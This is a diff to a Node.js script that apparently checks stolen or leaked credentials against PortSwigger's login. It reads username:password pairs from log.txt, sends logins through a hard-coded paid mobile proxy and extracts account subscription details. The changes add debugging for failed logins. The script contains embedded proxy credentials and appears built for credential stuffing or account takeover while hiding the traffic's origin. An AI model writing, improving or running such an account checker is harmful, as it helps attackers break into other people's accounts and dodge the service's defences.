@@ -2,15 +2,16 @@
 
 /**
  * Test single account subscription extraction (Windows compatible)
- * Uses temp file for POST data to avoid shell escaping issues
+ * Uses temp file for POST data and cookie jar for session persistence
  */
 
 const { execSync } = require('child_process');
 const fs = require('fs');
 const path = require('path');
+const os = require('os');
 
 const PROXY = 'http://buymobileproxycom:mugla9392@ankara8.buymobileproxy.com:8029';
-const COOKIE_JAR = path.join(require('os').tmpdir(), `portswigger_cookies_${Date.now()}.txt`);
+const COOKIE_JAR = path.join(os.tmpdir(), `portswigger_cookies_${Date.now()}.txt`);
 
 // Parse first account from log.txt
 const logFile = fs.readFileSync('log.txt', 'utf-8');
@@ -18,7 +19,7 @@ const [username, password] = logFile.split('\n')[0].trim().split(':').map(x => x
 
 console.log(`[*] Testing account: ${username}\n`);
 
-// Curl helper - Windows compatible with cookie jar for session persistence
+// Curl helper - Windows compatible with cookie jar
 function curl(url, post = null) {
     try {
         let cmd;
@@ -26,7 +27,7 @@ function curl(url, post = null) {
 
         if (post) {
             // For POST requests, write data to temp file to avoid escaping issues
-            const tempFile = path.join(require('os').tmpdir(), `curl_data_${Date.now()}_${Math.random().toString(36).substr(2, 9)}.txt`);
+            const tempFile = path.join(os.tmpdir(), `curl_data_${Date.now()}_${Math.random().toString(36).substr(2, 9)}.txt`);
             const data = Object.entries(post).map(([k,v]) => `${k}=${v}`).join('&');
             fs.writeFileSync(tempFile, data);
 
@@ -34,7 +35,7 @@ function curl(url, post = null) {
 
             try {
                 const output = execSync(cmd, { encoding: 'utf-8', shell: true, maxBuffer: 50*1024*1024, timeout: 35000 });
-                fs.unlinkSync(tempFile); // Clean up temp file
+                fs.unlinkSync(tempFile);
                 return parseResponse(output);
             } catch (e) {
                 try { fs.unlinkSync(tempFile); } catch {}
@@ -97,10 +98,21 @@ r = curl(`https://login.portswigger.net/u/login${state ? '?state='+state : ''}`,
     action: 'default'
 });
 console.log(`    Status: ${r.status}`);
+console.log(`    Location: ${r.location?.substring(0, 80) || '(none)'}`);
+console.log(`    Body size: ${r.body.length}`);
 
 let url = r.location;
 if (!url) {
     console.error('[!] Login failed - no redirect location');
+    console.error('[!] Saving login response to debug_login_response.html...');
+    fs.writeFileSync('debug_login_response.html', r.body);
+
+    // Check for error messages
+    if (r.body.includes('Invalid')) console.error('[!] Response contains "Invalid" - credentials rejected?');
+    if (r.body.includes('error')) console.error('[!] Response contains "error"');
+    if (r.body.includes('Incorrect')) console.error('[!] Response contains "Incorrect"');
+
+    console.error('[!] Open debug_login_response.html in browser to see what was returned');
     process.exit(1);
 }
 
